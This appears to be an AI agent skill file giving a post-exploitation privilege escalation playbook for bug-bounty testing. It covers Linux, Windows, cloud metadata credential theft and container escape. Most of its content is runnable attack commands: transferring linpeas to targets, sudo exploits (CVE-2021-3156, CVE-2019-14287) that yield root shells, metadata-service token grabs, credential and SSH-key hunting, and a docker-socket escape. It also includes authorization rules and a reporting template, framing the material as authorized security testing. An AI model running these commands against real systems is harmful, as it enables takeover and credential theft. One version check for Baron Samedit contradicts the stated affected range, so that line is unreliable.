---
name: bug-bounty-privesc
description: Use for privilege escalation testing after initial access is gained: Linux privesc, Windows privesc, cloud IAM escalation, sudo exploits, cron job abuse, container escape, and token theft detection.
---

# Bug Bounty Privilege Escalation

Use this skill **only after gaining initial access** via a vulnerability (RCE, SSRF, file upload, command injection, etc.). This is post-exploitation testing to determine impact and escalation paths.

**Tools location:** `~/bugbounty/tools/privesc/`

## Safety Rules

- **Authorization required:** Only run on systems you have explicit permission to test.
- **Scope gate:** Confirm privesc testing is allowed in the ROE (some programs forbid it).
- **Minimal impact:** Use enumeration first, exploits only when necessary for proof.
- **No persistence:** Do not create backdoors, add users, or establish persistence unless explicitly authorized.
- **Document everything:** Every command, output, and finding must be captured for the report.

## Available Tools

| Tool | Purpose | Size |
|------|---------|------|
| `linpeas.sh` | Linux comprehensive enumeration | 1.1M |
| `winpeas.exe` | Windows PEAS (64-bit) | 11M |
| `winpeas.bat` | Windows PEAS (batch for older systems) | 39K |
| `pspy64` | Linux process spy (64-bit) | 3.0M |
| `pspy32` | Linux process spy (32-bit) | 2.9M |
| `sudo-cve-2021-3156` | Baron Samedit sudo exploit (compiled) | 16K |
| `sudo-cve-2021-3156.c` | Source code | 2.0K |
| `sudo-cve-2019-14287.py` | Sudo bypass Python exploit | 1.6K |

## Linux Privilege Escalation

### Step 1: Run LinPEAS (Auto-Enumeration)

```bash
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
mkdir -p "$BB_ROOT/vulns/privesc"
ts="$(date +%Y%m%d-%H%M%S)"

# Transfer linpeas to target (if you have shell access)
# Option A: wget from your HTTP server
python3 -m http.server 8000 -d ~/bugbounty/tools/privesc/ &
# On target: wget http://YOUR-IP:8000/linpeas.sh -O /tmp/linpeas.sh

# Option B: Base64 encode and paste
base64 ~/bugbounty/tools/privesc/linpeas.sh | tr -d '\n' | ssh user@target "base64 -d > /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh > /tmp/linpeas-output.txt 2>&1"

# Capture output
cp /tmp/linpeas-output.txt "$BB_ROOT/vulns/privesc/linpeas-$ts.txt" 2>/dev/null || true
```

### Step 2: Manual Linux Checks

```bash
# Sudo permissions
sudo -l 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null | head -50

# SGID binaries
find / -perm -2000 -type f 2>/dev/null | head -20

# Writable files
find / -writable -type f 2>/dev/null | head -50

# Cron jobs
ls -la /etc/cron* /var/spool/cron 2>/dev/null
cat /etc/crontab 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Container escape clues
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup 2>/dev/null

# Kernel version (for exploits)
uname -a

# Running processes
ps aux

# Network services
netstat -tlnp 2>/dev/null || ss -tlnp

# History files
cat ~/.bash_history /root/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -20

# Credentials in files
grep -ri "password\|secret\|api_key\|token" /etc/ /opt/ /home/ 2>/dev/null | head -50
```

### Step 3: Process Monitoring (pspy)

```bash
# Transfer pspy to target
# On target: run pspy to watch for hidden cron jobs
./pspy64 > /tmp/pspy-output.txt 2>&1 &
# Wait 5-10 minutes, then check output
cat /tmp/pspy-output.txt
```

### Step 4: Sudo Exploits (Use with Extreme Caution)

**CVE-2021-3156 (Baron Samedit)** - Sudo 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1:

```bash
# Check sudo version first
sudo -V 2>&1 | head -1

# If version < 1.8.28, exploit may work
# TRANSFER: ~/bugbounty/tools/privesc/sudo-cve-2021-3156
# On target:
./sudo-cve-2021-3156
# Should give root shell if vulnerable
```

**CVE-2019-14287** - Sudo < 1.8.28 bypass:

```bash
# Check if user can run sudo with specific user ID
sudo -u#-1 /bin/bash 2>/dev/null
# If this drops to root, system is vulnerable
```

## Windows Privilege Escalation

### Step 1: Run WinPEAS

```bash
# Transfer winpeas.exe to target
# On target (PowerShell):
.\winpeas.exe > C:\temp\winpeas-output.txt 2>&1

# Or use batch version for older systems
winpeas.bat > C:\temp\winpeas-output.txt 2>&1
```

### Step 2: Manual Windows Checks

```powershell
# Token privileges
whoami /priv

# System info (kernel exploits)
systeminfo

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# Service permissions (weak ACLs)
sc sdshow <service_name>

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry: AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Registry: Auto-logon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Credentials in files
findstr /si "password" *.txt *.xml *.ini *.config 2>nul
findstr /si "api_key\|secret\|token" *.txt *.xml *.ini *.config 2>nul

# Stored credentials in Credential Manager
cmdkey /list

# Clipboard content (may contain sensitive data)
Get-Clipboard 2>$null
```

### Step 3: Windows Exploits

**Watson** - CVE-2020-0796 (SMBGhost) or other kernel exploits:
```powershell
# Run systeminfo, pipe to Watson for exploit suggestion
systeminfo | Watson
```

## Cloud Privilege Escalation

### AWS IAM Escalation

```bash
# Check current identity
aws sts get-caller-identity

# List attached policies
aws iam list-attached-user-policies --user-name <username>
aws iam list-attached-role-policies --role-name <role-name>

# Check for overly permissive policies
aws iam get-policy-version --policy-arn <arn> --version-id <version>

# Look for IAM:PassRole, iam:*, ec2:RunInstances with IAM instance profile
# These can lead to privilege escalation
```

### AWS Metadata Service

```bash
# AWS metadata v1 (no token required on older instances)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# AWS user-data (often contains scripts with credentials)
curl -s http://169.254.169.254/latest/user-data/
```

### GCP Metadata

```bash
# GCP metadata (requires header)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Metadata

```bash
# Azure instance metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2020-09-01"
```

## Container Escape

```bash
# Check if in container
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup 2>/dev/null

# Check for privileged container
cat /proc/1/status | grep -i cap

# Check for mounted docker socket
ls -la /var/run/docker.sock 2>/dev/null

# If docker socket mounted, can escape:
# docker run -v /:/host -it alpine chroot /host
```

## Privilege Escalation Checklist

The orchestrator auto-generates this at `$BB_ROOT/vulns/privesc-checklist.md`:

```markdown
## Linux
- [ ] Run: linpeas.sh
- [ ] Check: sudo -l
- [ ] Check: SUID binaries
- [ ] Check: Cron jobs
- [ ] Check: Writable files
- [ ] Check: Kernel exploits
- [ ] Check: Running processes
- [ ] Check: Network connections
- [ ] Check: Docker/LXC escape
- [ ] Check: Capabilities
- [ ] Tools: linpeas.sh, pspy64, sudo-cve-2021-3156

## Windows
- [ ] Run: winpeas.exe
- [ ] Check: Token privileges
- [ ] Check: AlwaysInstallElevated
- [ ] Check: Unquoted service paths
- [ ] Check: Weak service permissions
- [ ] Check: Kernel exploits
- [ ] Check: Credentials in files
- [ ] Check: Automatic logon
- [ ] Tools: winpeas.exe, winpeas.bat

## Cloud
- [ ] Check: Metadata service
- [ ] Check: AWS keys in env/creds
- [ ] Check: User data
- [ ] Check: S3 bucket permissions
```

## Output Files

Save all privesc enumeration output:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Linpeas output
cp /tmp/linpeas-output.txt "$BB_ROOT/vulns/privesc/linpeas-$ts.txt"

# Manual checks
script -c "bash" "$BB_ROOT/vulns/privesc/manual-session-$ts.txt"

# Pspy output
cp /tmp/pspy-output.txt "$BB_ROOT/vulns/privesc/pspy-$ts.txt"
```

## Reporting

When a privesc path is found, document:

1. **Initial access vector:** How did you get the first shell?
2. **Enumeration findings:** What did linpeas/winpeas/manual checks reveal?
3. **Exploitation path:** Which misconfiguration/exploit was used?
4. **Final privilege:** What level was achieved (root/SYSTEM/admin)?
5. **Impact:** What can an attacker do at this privilege level?
6. **Remediation:** How to fix the issue?

```markdown
## Privilege Escalation Finding

**Severity:** Critical/High

**Path:** www-data → root via sudo CVE-2021-3156

**Evidence:**
- Linpeas output: `privesc/linpeas-20260705-123456.txt`
- Exploit run: `privesc/sudo-exploit-run-20260705-123456.txt`
- Root shell proof: `id` command showing uid=0

**Impact:** Full system compromise, access to all data, lateral movement

**Remediation:** Upgrade sudo to 1.8.28+, implement proper sudo policies
```

Route all privesc findings through `bug-bounty-validation` for final impact assessment before reporting.